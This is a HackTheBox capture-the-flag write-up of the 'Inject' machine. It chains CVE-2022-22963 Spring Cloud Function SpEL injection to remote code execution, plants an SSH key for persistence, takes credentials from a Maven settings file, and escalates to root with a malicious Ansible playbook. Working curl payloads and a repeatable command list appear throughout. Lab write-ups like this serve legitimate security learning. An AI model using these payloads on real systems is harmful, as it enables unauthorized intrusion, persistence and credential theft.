---
layout: default
title: "HTB - Inject"
---

# HackTheBox - Inject

**Date:** 2026-06-02
**Target:** <target-ip>
**OS:** Ubuntu Linux (OpenSSH 8.2p1 Ubuntu 4ubuntu0.5)
**Status:** Rooted

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` |
| Initial Access | Spring Cloud Function SpEL injection |
| Privilege Escalation | Writable Ansible automation executed as root |
| Final Access | root |

---

## Summary

Inject hosts a Spring Boot web application on port 8080. The `/environment` endpoint leaks a Spring Cloud Function error that fingerprints the framework and points directly to **CVE-2022-22963** — unauthenticated SpEL injection via a routing header, giving RCE as `frank`. Lateral movement to `phil` used credentials recovered from frank's Maven settings file. Privilege escalation abused a root-owned Ansible cron task that picked up playbooks from a directory writable by the `staff` group.

---

## Reconnaissance

### Port Scan

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
8080/tcp open  http    (Spring Boot web application)
```

Two ports only — SSH and a web app. SSH is rarely the entry point without credentials, so the web app is the primary focus.

### Web Enumeration (ffuf)

```
/blogs       200  (5371b)
/register    200  (5654b)
/upload      200  (1857b)
/environment 500  (712b)   ← Spring Boot framework error
/error       500  (106b)
```

### Framework Fingerprint

The `/environment` path triggered an unhandled exception that revealed Spring Boot internals:

```bash
curl -s http://<target-ip>:8080/environment
```

```json
{
  "status": 500,
  "error": "Internal Server Error",
  "message": "Discovered 3 methods that would qualify as 'functional'...
              Class 'class org.springframework.boot.ApplicationServletEnvironment'
              is not a FunctionalInterface.",
  "path": "/environment"
}
```

The phrase "methods that would qualify as 'functional'" is diagnostic: it's the exact error message produced when Spring Cloud Function's routing logic encounters a non-functional interface. This confirms Spring Cloud Function is present and the `/functionRouter` endpoint is likely active — which is the attack surface for **CVE-2022-22963**.

---

## Initial Access - CVE-2022-22963 (Spring Cloud Function SpEL Injection)

**CVE-2022-22963** allows unauthenticated RCE via a malicious `spring.cloud.function.routing-expression` HTTP header sent to `/functionRouter`. Spring Cloud Function evaluates this header as a Spring Expression Language (SpEL) expression, which supports calling arbitrary Java methods — including `Runtime.exec()`.

The vulnerability requires no authentication, no special content, and affects Spring Cloud Function versions 3.1.6 and 3.2.2 and earlier.

### Step 1 - Confirm RCE

```bash
curl -s -X POST http://<target-ip>:8080/functionRouter \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")' \
  -H 'Content-Type: text/plain' \
  -d 'test'
```

Response: `"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"`

The error confirms the `exec()` call fired — it returned a `ProcessImpl` object, which Spring tried to serialize to a string and failed. The process ran; we just can't see its output yet.

### Step 2 - Capture Command Output

`Runtime.exec()` returns a `Process` object. To read its stdout, wrap it with `java.util.Scanner`, which can consume an `InputStream`:

```bash
curl -s -X POST http://<target-ip>:8080/functionRouter \
  -H 'spring.cloud.function.routing-expression: new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next()' \
  -H 'Content-Type: text/plain' \
  -d 'test'
```

Response:
```json
{
  "message": "Failed to lookup function ... whcih resolved to 'uid=1000(frank) gid=1000(frank) groups=1000(frank)\n' function name."
}
```

**Running as `frank`.** The `useDelimiter("\\A")` trick reads the entire stream as a single token — `\\A` is a regex anchor for "start of input," making `Scanner` never split on any delimiter.

### Step 3 - Plant SSH Key for Stable Shell

Generate a keypair locally:

```bash
ssh-keygen -t ed25519 -f ./loot/frank_key -N ''
```

Write the public key to frank's `authorized_keys` via RCE. `exec(String)` uses the system shell tokenizer, which chokes on pipes and redirects — pass a `String[]` to bypass the shell and call bash directly:

```bash
PUBKEY=$(cat ./loot/frank_key.pub)
curl -s -X POST http://<target-ip>:8080/functionRouter \
  -H "spring.cloud.function.routing-expression: new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"mkdir -p /home/frank/.ssh && echo '${PUBKEY}' > /home/frank/.ssh/authorized_keys && chmod 700 /home/frank/.ssh && chmod 600 /home/frank/.ssh/authorized_keys && echo done\"}).getInputStream()).useDelimiter(\"\\\\A\").next()" \
  -H 'Content-Type: text/plain' \
  -d 'test'
```

Response confirms: `"whcih resolved to 'done\n'"`

```bash
ssh -i ./loot/frank_key frank@<target-ip>
# uid=1000(frank) gid=1000(frank) groups=1000(frank)
```

---

## Lateral Movement - frank to phil

### Credential Recovery

With a shell as frank, enumerate the home directory for application credentials. Maven projects store repository credentials in `~/.m2/settings.xml`:

```bash
cat /home/frank/.m2/settings.xml
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" ...>
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password><redacted-password></password>
    </server>
  </servers>
</settings>
```

Maven's `settings.xml` is a common credential store on developer machines — it holds repository authentication for tools like Nexus and Artifactory. Here it contains phil's plaintext password.

### Switch to phil

```bash
echo "<redacted-password>" | su -s /bin/bash phil -c "id"
# uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
```

Phil is a member of **group `staff` (gid=50)** — note this for privilege escalation.

### User Flag

```bash
echo "<redacted-password>" | su -s /bin/bash phil -c "cat /home/phil/user.txt"
# <redacted-32-hex>
```

---

## Privilege Escalation - phil to root (Ansible Automation Abuse)

### Discovery: Writable Ansible Tasks Directory

Find paths writable by the current user or their groups:

```bash
find / -writable -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" 2>/dev/null
```

Key finding: **`/opt/automation/tasks`** is writable by the `staff` group:

```
drwxrwxr-x 2 root staff 4096 /opt/automation/tasks
```

The directory contains a root-owned playbook:

```bash
cat /opt/automation/tasks/playbook_1.yml
```

```yaml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```

The playbook's timestamp reflects recent activity and it periodically reappears after deletion — a root-owned cron task is running `ansible-playbook` against this directory automatically. Because the directory is `staff`-writable and phil is in `staff`, any playbook dropped here will be executed as root.

### Exploitation: Drop Malicious Playbook

As phil, write a new playbook to the tasks directory:

```bash
cat > /opt/automation/tasks/evil_playbook.yml << 'EOF'
- hosts: localhost
  tasks:
  - name: Read root flag
    ansible.builtin.shell: cat /root/root.txt > /tmp/flag.txt && chmod 644 /tmp/flag.txt
EOF
```

### Wait for Automation Trigger

Poll for the output file:

```bash
watch -n 15 "cat /tmp/flag.txt 2>/dev/null"
```

After the cron fires and ansible-playbook processes the tasks directory:

```bash
cat /tmp/flag.txt
# <redacted-32-hex>
```

**Root flag captured.**

---

## Attack Chain Summary

```
[Recon] Port scan -> TCP 22 (SSH), TCP 8080 (Spring Boot)
    |
[Fingerprint] GET /environment -> Spring Cloud Function error -> CVE-2022-22963
    |
[RCE] POST /functionRouter with SpEL payload -> exec as frank
    |
[Foothold] Write SSH key to /home/frank/.ssh/authorized_keys -> SSH shell as frank
    |
[Lateral] cat /home/frank/.m2/settings.xml -> phil:<redacted-password> -> su phil
    |
[PrivEsc] Write malicious Ansible playbook to /opt/automation/tasks/ (staff-writable)
    |
[Root] Root-owned cron runs ansible-playbook -> root flag
```

---

## Key Commands (Repeatable)

```bash
TARGET=<target-ip>

# 1. Confirm CVE-2022-22963 RCE
curl -s -X POST http://$TARGET:8080/functionRouter \
  -H 'spring.cloud.function.routing-expression: new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next()' \
  -H 'Content-Type: text/plain' -d 'test'

# 2. Generate SSH key and plant on frank
ssh-keygen -t ed25519 -f frank_key -N ''
PUBKEY=$(cat frank_key.pub)
curl -s -X POST http://$TARGET:8080/functionRouter \
  -H "spring.cloud.function.routing-expression: new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"mkdir -p /home/frank/.ssh && echo '${PUBKEY}' > /home/frank/.ssh/authorized_keys && chmod 700 /home/frank/.ssh && chmod 600 /home/frank/.ssh/authorized_keys && echo done\"}).getInputStream()).useDelimiter(\"\\\\A\").next()" \
  -H 'Content-Type: text/plain' -d 'test'

# 3. SSH as frank
ssh -i frank_key frank@$TARGET

# 4. Read Maven credentials (from frank shell)
cat /home/frank/.m2/settings.xml

# 5. Switch to phil
echo "<redacted-password>" | su -s /bin/bash phil -c "cat /home/phil/user.txt"

# 6. Drop malicious Ansible playbook (as phil)
echo "<redacted-password>" | su -s /bin/bash phil -c "
cat > /opt/automation/tasks/evil_playbook.yml << 'EOF'
- hosts: localhost
  tasks:
  - name: Read root flag
    ansible.builtin.shell: cat /root/root.txt > /tmp/flag.txt && chmod 644 /tmp/flag.txt
EOF"

# 7. Wait and retrieve root flag
sleep 30 && ssh -i frank_key frank@$TARGET 'cat /tmp/flag.txt'
```

---

## Notes

- The `/environment` error text ("methods that would qualify as 'functional'") is an unusually direct framework fingerprint — it names Spring Cloud Function's internal routing logic in the error body, collapsing fingerprinting and CVE identification into a single request.
- CVE-2022-22963 requires no authentication. The `Scanner`-based output wrapper is necessary because `Runtime.exec()` returns a `ProcessImpl` object, not a `String` — SpEL can call the method but cannot coerce the result to string automatically. Reading the process's `InputStream` with `Scanner` bridges the gap.
- The `exec(String)` overload tokenizes the command on spaces and passes it directly to `execve` — no shell, no pipes, no redirects. Use `exec(String[])` passing `{"/bin/bash", "-c", "..."}` whenever shell features are needed.
- The Ansible privesc is a misconfiguration: a root-owned automation process should never pick up files written by unprivileged users. The `staff` group having write access to the tasks directory makes the entire automation chain exploitable by any member.
- Maven's `~/.m2/settings.xml` is a reliable credential source on developer machines and build servers — it stores plaintext or weakly-encoded passwords for Maven repository access and is often overlooked in post-exploitation enumeration.

---

## Root Cause

The demonstrated path worked because the target exposed a concrete bridge from reconnaissance to execution: Spring Cloud Function SpEL injection. The chain became critical when Writable Ansible automation executed as root converted that foothold into root.

## Impact

Successful exploitation reached root. That access is enough to read sensitive files, execute commands in the privileged context, collect credentials, and use the host or domain position as a pivot if similar trust relationships exist elsewhere.

## Remediation

- Remove or harden the specific exposure used for initial access: Spring Cloud Function SpEL injection.
- Fix the privilege boundary that enabled escalation: Writable Ansible automation executed as root.
- Rotate credentials observed or replayed during the chain and search for reuse on adjacent systems.
- Validate the fix by safely replaying the enumeration steps that originally exposed the weakness.

## Detection Opportunities

- Alert on suspicious access patterns against the service that enabled initial access.
- Correlate successful authentication, process creation, and privilege-boundary events after enumeration activity.
- Monitor for the specific escalation signal: Writable Ansible automation executed as root.

## Lessons Learned

- The useful lesson is the connection between Spring Cloud Function SpEL injection and Writable Ansible automation executed as root, not just the individual command that worked.
- Preserve the observations that explain why each pivot made sense.
- Write remediation from the root cause of each step so the report reads like both an operator narrative and a defender action plan.

## Attack Path

1. Recon identified the exposed services and separated useful attack surface from noise.
2. The first break was Spring Cloud Function SpEL injection.
3. Post-exploitation enumeration exposed Writable Ansible automation executed as root.
4. The final privileged context was reached and the required proof was captured.

---
